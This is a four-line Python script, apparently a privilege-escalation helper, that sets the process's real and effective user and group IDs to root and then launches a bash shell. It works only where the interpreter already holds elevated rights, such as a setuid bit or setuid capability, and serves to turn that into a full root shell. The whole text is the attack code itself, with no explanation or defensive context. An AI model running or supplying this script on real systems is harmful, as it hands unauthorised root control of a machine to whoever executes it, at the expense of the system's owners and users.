import os
os.setreuid(0,0)
os.setregid(0,0)
os.system('/bin/bash')
